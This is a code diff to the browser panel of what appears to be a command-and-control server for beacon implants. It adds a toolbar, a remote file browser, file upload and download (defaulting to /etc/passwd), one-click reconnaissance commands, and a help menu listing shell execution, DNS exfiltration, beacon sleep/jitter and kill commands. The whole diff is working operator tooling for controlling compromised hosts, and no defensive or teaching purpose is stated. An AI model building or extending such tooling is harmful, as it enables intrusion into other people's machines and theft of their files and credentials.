@@ -528,6 +528,42 @@ header .info{font-size:11px;color:var(--text2)}
 }
 .input-bar button:hover{background:var(--red)}
 
+/* Toolbar */
+.toolbar{
+  display:flex;gap:6px;padding:6px 0;flex-wrap:wrap;
+}
+.toolbar button{
+  padding:6px 14px;background:var(--surface2);color:var(--text);border:1px solid var(--border);
+  border-radius:5px;font-size:12px;cursor:pointer;font-family:var(--sans);transition:all 0.15s;
+  display:flex;align-items:center;gap:5px;
+}
+.toolbar button:hover{background:rgba(255,26,26,0.12);border-color:var(--red-dim);color:var(--red)}
+.toolbar button .ico{font-size:14px}
+
+/* File browser */
+.filebrowser{padding:8px 0}
+.fb-path{
+  display:flex;align-items:center;gap:8px;padding:6px 0;
+  font-family:var(--mono);font-size:13px;color:var(--text2);
+}
+.fb-path button{
+  background:var(--surface2);color:var(--text);border:1px solid var(--border);
+  border-radius:4px;padding:3px 10px;font-size:12px;cursor:pointer;font-family:var(--mono);
+}
+.fb-path button:hover{border-color:var(--red-dim);color:var(--red)}
+.fb-list{max-height:400px;overflow-y:auto}
+.fb-entry{
+  display:flex;align-items:center;gap:10px;padding:5px 10px;
+  border-radius:4px;cursor:pointer;font-family:var(--mono);font-size:13px;
+  transition:background 0.1s;
+}
+.fb-entry:hover{background:rgba(255,26,26,0.06)}
+.fb-entry .ico{width:20px;text-align:center;font-size:15px}
+.fb-entry.dir .name{color:var(--red)}
+.fb-entry.file .name{color:var(--text)}
+.fb-entry .size{color:var(--text2);font-size:11px;margin-left:auto}
+.fb-entry .perm{color:var(--text2);font-size:11px;width:80px}
+
 /* Empty state */
 .empty{
   display:flex;flex-direction:column;align-items:center;justify-content:center;
@@ -602,6 +638,18 @@ async function refreshAgents(){
 }
 
 function selectAgent(id){
+  if(selectedAgent === id){
+    selectedAgent = null;
+    if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
+    document.getElementById("content").innerHTML = `
+      <div class="empty">
+        <img src="/logo.png" alt="" onerror="this.style.display='none'">
+        <p>Waiting for agents to connect...</p>
+        <p style="font-size:12px;color:#444">Beacon traffic accepted on any POST path</p>
+      </div>`;
+    refreshAgents();
+    return;
+  }
   selectedAgent = id;
   if(pollTimer) clearInterval(pollTimer);
   renderAgentView(id);
@@ -621,10 +669,22 @@ async function renderAgentView(id){
       <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${info.pid||'?'} · up ${formatUptime(info.uptime||0)}</span>
     </div>
     <div class="terminal-wrap">
+      <div class="toolbar">
+        <button onclick="openFileBrowser()"><span class="ico">📂</span> Files</button>
+        <button onclick="triggerUpload()"><span class="ico">⬆</span> Upload</button>
+        <button onclick="promptDownload()"><span class="ico">⬇</span> Download</button>
+        <button onclick="quickCmd('shell','whoami')"><span class="ico">👤</span> whoami</button>
+        <button onclick="quickCmd('shell','id')"><span class="ico">🔑</span> id</button>
+        <button onclick="quickCmd('shell','uname -a')"><span class="ico">💻</span> sysinfo</button>
+        <button onclick="quickCmd('shell','ps aux 2>/dev/null || tasklist')"><span class="ico">⚙</span> procs</button>
+        <button onclick="quickCmd('shell','netstat -tlnp 2>/dev/null || netstat -an')"><span class="ico">🌐</span> netstat</button>
+        <button onclick="showHelp()"><span class="ico">❓</span> Help</button>
+      </div>
+      <div id="filebrowser"></div>
       <div class="terminal" id="terminal"></div>
       <div class="input-bar">
         <span class="prompt">${esc(id)} ❯</span>
-        <input id="cmd-input" placeholder="shell whoami / ls /tmp / cat /etc/passwd / sleep 60 20 / kill" autocomplete="off">
+        <input id="cmd-input" placeholder="shell whoami / ls /tmp / cat /etc/passwd / upload /path / download /path" autocomplete="off">
         <button onclick="sendCmd()">Send</button>
       </div>
     </div>
@@ -723,6 +783,149 @@ function formatUptime(s){
   if(s<3600) return Math.floor(s/60)+"m";
   if(s<86400) return Math.floor(s/3600)+"h "+Math.floor((s%3600)/60)+"m";
   return Math.floor(s/86400)+"d "+Math.floor((s%86400)/3600)+"h";
+}
+
+// ── Quick commands ──
+async function quickCmd(cmd, args){
+  if(!selectedAgent) return;
+  await api("/api/agents/"+selectedAgent+"/task",{
+    method:"POST", body:JSON.stringify({cmd, args, data:""})
+  });
+  pollHistory(selectedAgent);
+}
+
+// ── File browser ──
+let fbPath = "/";
+let fbVisible = false;
+
+function openFileBrowser(path){
+  if(!selectedAgent) return;
+  if(!path && fbVisible){ closeFB(); return; }
+  fbPath = path || "/";
+  fbVisible = true;
+  quickCmd("ls", fbPath);
+  document.getElementById("filebrowser").innerHTML = `
+    <div class="filebrowser">
+      <div class="fb-path">
+        <button onclick="closeFB()">✕</button>
+        <button onclick="openFileBrowser(parentDir(fbPath))">⬆ Up</button>
+        <span>📂 ${esc(fbPath)}</span>
+        <button onclick="openFileBrowser(fbPath)" style="margin-left:auto">⟳ Refresh</button>
+      </div>
+      <div class="fb-list" id="fb-list"><div class="t-pending">Loading...</div></div>
+    </div>`;
+  setTimeout(() => renderFBFromHistory(), 3000);
+}
+
+function closeFB(){
+  fbVisible = false;
+  document.getElementById("filebrowser").innerHTML = "";
+}
+
+function parentDir(p){
+  const parts = p.replace(/\/$/,"").split("/");
+  parts.pop();
+  return parts.join("/") || "/";
+}
+
+async function renderFBFromHistory(){
+  if(!fbVisible || !selectedAgent) return;
+  const hist = await api("/api/agents/"+selectedAgent+"/history");
+  const lsEntries = hist.filter(h => h.cmd==="ls" && h.args===fbPath && h.status==="ok");
+  if(!lsEntries.length){
+    setTimeout(renderFBFromHistory, 1000);
+    return;
+  }
+  const output = lsEntries[lsEntries.length-1].output || "";
+  const list = document.getElementById("fb-list");
+  if(!list) return;
+  list.innerHTML = "";
+  const lines = output.split("\n").filter(l => l.trim());
+  lines.forEach(line => {
+    const entry = document.createElement("div");
+    const parts = line.trim().split(/\s+/);
+    const perm = parts[0] || "";
+    const size = parts.length > 1 ? parts[parts.length-2] : "";
+    const name = parts.length > 1 ? parts[parts.length-1] : line.trim();
+    const isDir = perm.startsWith("d") || name.endsWith("/");
+    entry.className = "fb-entry " + (isDir ? "dir" : "file");
+    const fullPath = fbPath.endsWith("/") ? fbPath+name : fbPath+"/"+name;
+    if(isDir){
+      entry.onclick = () => openFileBrowser(fullPath);
+      entry.innerHTML = `<span class="ico">📁</span><span class="name">${esc(name)}</span><span class="size">${esc(size)}</span><span class="perm">${esc(perm)}</span>`;
+    } else {
+      entry.onclick = () => { document.getElementById("cmd-input").value = "cat "+fullPath; document.getElementById("cmd-input").focus(); };
+      entry.innerHTML = `<span class="ico">📄</span><span class="name">${esc(name)}</span><span class="size">${esc(size)}</span><span class="perm">${esc(perm)}</span>`;
+    }
+    list.appendChild(entry);
+  });
+  if(!lines.length) list.innerHTML = '<div class="t-system">Empty directory</div>';
+}
+
+// ── Upload ──
+function triggerUpload(){
+  if(!selectedAgent) return;
+  const remotePath = prompt("Remote path to write file to:", "/tmp/");
+  if(!remotePath) return;
+  const fileInput = document.createElement("input");
+  fileInput.type = "file";
+  fileInput.onchange = async () => {
+    const file = fileInput.files[0];
+    if(!file) return;
+    const buf = await file.arrayBuffer();
+    const bytes = new Uint8Array(buf);
+    let b64 = "";
+    const chunk = 8192;
+    for(let i=0;i<bytes.length;i+=chunk){
+      b64 += String.fromCharCode.apply(null, bytes.subarray(i, i+chunk));
+    }
+    b64 = btoa(b64);
+    const dest = remotePath.endsWith("/") ? remotePath+file.name : remotePath;
+    await api("/api/agents/"+selectedAgent+"/task",{
+      method:"POST", body:JSON.stringify({cmd:"upload", args:dest, data:b64})
+    });
+    pollHistory(selectedAgent);
+  };
+  fileInput.click();
+}
+
+// ── Download ──
+function promptDownload(){
+  if(!selectedAgent) return;
+  const path = prompt("Remote file path to download:", "/etc/passwd");
+  if(!path) return;
+  quickCmd("download", path);
+}
+
+// ── Help ──
+function showHelp(){
+  const term = document.getElementById("terminal");
+  if(!term) return;
+  term.innerHTML += `
+    <div class="t-info">━━━ Available commands ━━━</div>
+    <div class="t-output">  shell &lt;cmd&gt;       Execute shell command</div>
+    <div class="t-output">  ls &lt;path&gt;         List directory</div>
+    <div class="t-output">  cat &lt;path&gt;        Read file contents</div>
+    <div class="t-output">  pwd               Print working directory</div>
+    <div class="t-output">  cd &lt;path&gt;         Change directory</div>
+    <div class="t-output">  cp &lt;src&gt; &lt;dst&gt;    Copy file</div>
+    <div class="t-output">  mv &lt;src&gt; &lt;dst&gt;    Move/rename file</div>
+    <div class="t-output">  rm &lt;path&gt;         Remove file/directory</div>
+    <div class="t-output">  mkdir &lt;path&gt;      Create directory</div>
+    <div class="t-output">  chmod &lt;mode&gt; &lt;f&gt;  Change permissions</div>
+    <div class="t-output">  write &lt;path&gt;      Write text to file (via data)</div>
+    <div class="t-output">  upload &lt;path&gt;     Upload file to agent</div>
+    <div class="t-output">  download &lt;path&gt;   Download file from agent</div>
+    <div class="t-output">  exfil &lt;path&gt;      Exfiltrate file via DNS</div>
+    <div class="t-output">  sleep &lt;s&gt; &lt;j%&gt;    Set beacon interval + jitter</div>
+    <div class="t-output">  kill              Terminate beacon</div>
+    <div class="t-info">━━━ Toolbar buttons ━━━</div>
+    <div class="t-output">  📂 Files          Interactive file browser</div>
+    <div class="t-output">  ⬆ Upload          Pick local file → upload to agent</div>
+    <div class="t-output">  ⬇ Download        Download file from agent</div>
+    <div class="t-info">━━━━━━━━━━━━━━━━━━━━━━━━</div>
+  `;
+  term.scrollTop = term.scrollHeight;
 }
 
 setInterval(refreshAgents, 3000);
